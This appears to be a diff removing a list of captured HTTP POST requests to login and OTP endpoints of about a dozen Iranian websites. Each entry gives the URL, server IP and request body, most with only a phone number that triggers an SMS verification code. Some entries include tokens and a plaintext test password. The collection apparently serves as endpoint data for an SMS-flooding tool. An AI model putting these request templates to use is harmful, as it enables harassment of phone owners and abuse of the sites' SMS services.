----------------------------------------------------------------------------------------------
-Request URL:
-https://sensishopping.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.169.6.230:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: digits_check_mob
-countrycode: +98
-mobileNo: 9121111010
-csrf: a7c6bd28b4
-login: 1
-username: 
-email: 
-captcha: 
-captcha_ses: 
-digits: 1
-json: 1
-whatsapp: 0
-mobmail: 912 111 1010
-dig_otp: 
-dig_nounce: a7c6bd28b4
----------------------------------------------------------------------------------------------
-Request URL:
-https://davidjonesonline.ir/api/v1/sessions/login_request
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.166.104.3:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{mobile_phone: "09123456456"}
-mobile_phone
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://gruccia.ir/login?back=my-account
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-168.119.194.199:443
-Referrer Policy:
-no-referrer-when-downgrade
-
-
-back: my-account
-username: 09128887484
-id_customer: 
-back: 
-firstname: بثعاهبتنب
-lastname: ببعباثعبهث
-password: 1234567890
-action: register
-back: my-account
-ajax: 1
----------------------------------------------------------------------------------------------
-Request URL:
-https://app.inchand.com/api/v1/authentication/initialize
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456456"}
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.vitrin.shop/api/v1/user/request_code
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-104.21.80.1:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{phone_number: "09123456456", forgot_password: false}
-forgot_password
-: 
-false
-phone_number
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://mobilexpress.ir/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.172.213.7:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-login_digt_countrycode: +98
-digits_phone: 912 345 6456
-action_type: phone
-digits: 1
-instance_id: aed9a7157a23ae0db5c79772f4d6fa00
-action: digits_forms_ajax
-type: login
-digits_step_1_type: 
-digits_step_1_value: 
-digits_step_2_type: 
-digits_step_2_value: 
-digits_step_3_type: 
-digits_step_3_value: 
-digits_login_email_token: 
-digits_redirect_page: //mobilexpress.ir/
-digits_form: cb2fb16c67
-_wp_http_referer: /
-show_force_title: 1
-
-
-2:
-Request URL:
-https://mobilexpress.ir/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.172.213.7:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-login_digt_countrycode: +98
-digits_phone: 912 345 6456
-action_type: phone
-digits_reg_name: fdefssf
-digits_process_register: 1
-sms_otp: 
-digits_otp_field: 1
-digits: 1
-instance_id: aed9a7157a23ae0db5c79772f4d6fa00
-action: digits_forms_ajax
-type: login
-digits_step_1_type: 
-digits_step_1_value: 
-digits_step_2_type: 
-digits_step_2_value: 
-digits_step_3_type: 
-digits_step_3_value: 
-digits_login_email_token: 
-digits_redirect_page: //mobilexpress.ir/
-digits_form: cb2fb16c67
-_wp_http_referer: /
-show_force_title: 1
-container: digits_protected
-sub_action: sms_otp
----------------------------------------------------------------------------------------------
-Request URL:
-https://gateway.joordaroo.com/lgc/v1/auth/request-otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.233.120:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456456"}
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://api.beroozmart.com/api/pub/account/check-user
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{username: "+989123456456"}
-username
-: 
-"+989123456456"
-
-
-2:
-Request URL:
-https://api.beroozmart.com/api/pub/account/send-otp
-Request Method:
-POST
-Status Code:
-204 No Content
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{mobile: "09123456456", sendViaSms: true, email: null, sendViaEmail: false}
-email
-: 
-null
-mobile
-: 
-"09123456456"
-sendViaEmail
-: 
-false
-sendViaSms
-: 
-true
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.2nabsh.com/auth/checkUsername
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.74.221.137:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-username: 09123456456
-just_verify_mobile: false
-_token: ZIQS5jvFzoufV3ENFj0MyeTusKbvmFJSRaRMiNdm
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.sibche.com/profile/sendCode
-Request Method:
-POST
-Status Code:
-202 Accepted
-Remote Address:
-185.3.124.181:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456789", spec-g: null,…}
-g-recaptcha-response
-: 
-"03AFcWeA7IbrUSqAm74wzqPx8sjUuxItcUFcT1JqnsHROtuA-R_S5yDTDn4XUaDXqjxfGVLv82ZlYTQ0galKIJEQ68ypCUxOFhJjMAl_YD7ES18Qlt1NlxWGQhcsURj_UdPmHftC-jr8dTyN06xmkMcEkbEevsv2_47eHeSDPbomeZ19mCSa6fvAmFrouIFcff788egPSShy9dN_dlbixVdAq8abyAji8WI_qENyxZdvCmipeYOdDFxqkOweB54YIGjb2WgIC4B2uMxyZ6_esbYasMiHzcLJ6yuLDAGQKAlMxAAsRP8QgZl5evh7Y4bEIFTkzHQdIFdG8lGrAOeqCMK5pmgMzw_4mZssk-1HHwf2a7Dl--HZm3573lGqymnCla0ai7-7D1MYTrBr5sWHDTADtqj1j7CMSK2vKKRWQIwywdMibHlIMSQ_fge_JlXraNzqsb6JzlofKXZptl2iRZKmJfBRmhs9yR7dt6YDCL1ZzDeM5g9pq_WBKtI4jN-Gfua4JeckH38DGHFN07PXRkCxrhpyiyymlDRrydysi2Tz7YhgUaSQSVvA4bNqhlfm3ezIZGgPfoaFzW5ev4gfKl53y2IkJZ2nlUKA-PeEEQTGJ3RJ_zd03L_cqDOnygYyPQR8M5L_7EtpdS9jMHqJyNEifhyk8whbJq7mBOuItMFbY_2CMAHWmRoSRfJHgsirRtNH5EDcUUd7YsDIp0F_eGcYtdg9JXyWlnT8YwDpnA3axHKVIOdXiTFrfkBql8Q60tHHp4EdBp8GTCPfcECfw26uVFjyzaHNKSBLweIRny-_I6Ua5Vzr8YGUjEy3SCL6PcxhgB3K81ynhZwCvrdD-iGuBlnUzxKndB0xvVYAPRnZFAWooqktRvbhrRX49YDQSfYoGuSpaJLy0PvoIJPIMqivnyl7D3eJh2h-PFsu99oo0p1IJyag6N-nnsQYpeF_UbJgJqs5RS9D2hIY-kHaPZbBX32w-mZ0MfAeFeYkI2wXEzvggFECpl0pLzLe2PDwX4dY8ujDJjj_GNyEWMm82Hwh4czmA-FYjlax5VvbKQc9m2l6hEK3_O9GSUxxAJ_zhB4Mnmp5aAbXxf2zztOuk0kMUgUyFcLyutxSYtneKHi5OW-FiDRonNtKFYuZ1so1QCcCWi7b1cFn3mjB4QU5J7rPjHyAGnsvlK6f_M7fImqGAQjgPlfD4v2YlcKLmInot1SJ5BSPfAf6pJFy7Vr6UBVYep_2UKqo7GyvC3-VUhYHubgxRji7okvv0zHBKrAm41c-UgJVJoCDCPHCpdKBUl9mxHaDO0rriGjvlHt2v-lXoY5i20NyGryaPRWNl2ETUog7-O9mA6e265O-zGxqLk7O3pTo8BGQRT6ekgs1QHS5iHLTloCYg6oEHCVUelhP2KF8P7JWUxgvOF2FAZWuSGNKoBTg1LJ_YaykQpc6MuXccJ5d9x6hKDUic-Qnf7vws9NEkWkzcoZSUetOA1d8bFAe9XZ554DX5g-JF-ea4-XKh5i2Rgx1nWXMcnVNXnA3v3LNgPtSTVHDETi_U2PJFjtCoJmOf-W4_wAIBf0eqLyRevS8mAiZ_C6gIJ4IJbpumUNYC2Xa_P-amCUnsU_T76LuAduUDWtzgo3b2VvKo08gSXXHyvgL8bWeatT_swurs4AVxIM6JntLqKGOMCPw8eMw8GS5aBxr68jG4XnQaPY4eK-jX4loW9HAm26e6SYX9XQwGIieotT0Cz3Hk44axJ55BYFat_GS9z0S30MZr6lHe4CuYgz7h_bEnuwPK-cpVLghuK0gLqGvrurdbAnyfHBzKDkHrwfN8lrc3gr1W1m3WRtp6dMD5EQmfCU8VVKgFZvkooN4rZrwQc29yKQyigAMuk1VrOJ2xAgFS4TdV6q8x4VLxnzOOX3c0YKNf46ibu2fK-Ds18zJEs-BQV_j3UvtSN6YPmgw1-h5SRln4RpQRovwV9By4zxofvo_TAFLG3SQYOQw9Abalq1Txb94vVdBX9QSg0A2XNMs9O-cS2Dn2V1IGrRSrdaHI"
-mobile
-: 
-"09123456789"
-spec-g
-: 
-null
----------------------------------------------------------------------------------------------
-Request URL:
-https://bimebazar.com/accounts/api/login_sec/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{username: "09128887484", type: "sms"}
-type
-: 
-"sms"
-username
-: 
-"09128887484"
-
----------------------------------------------------------------------------------------------
 
 
 
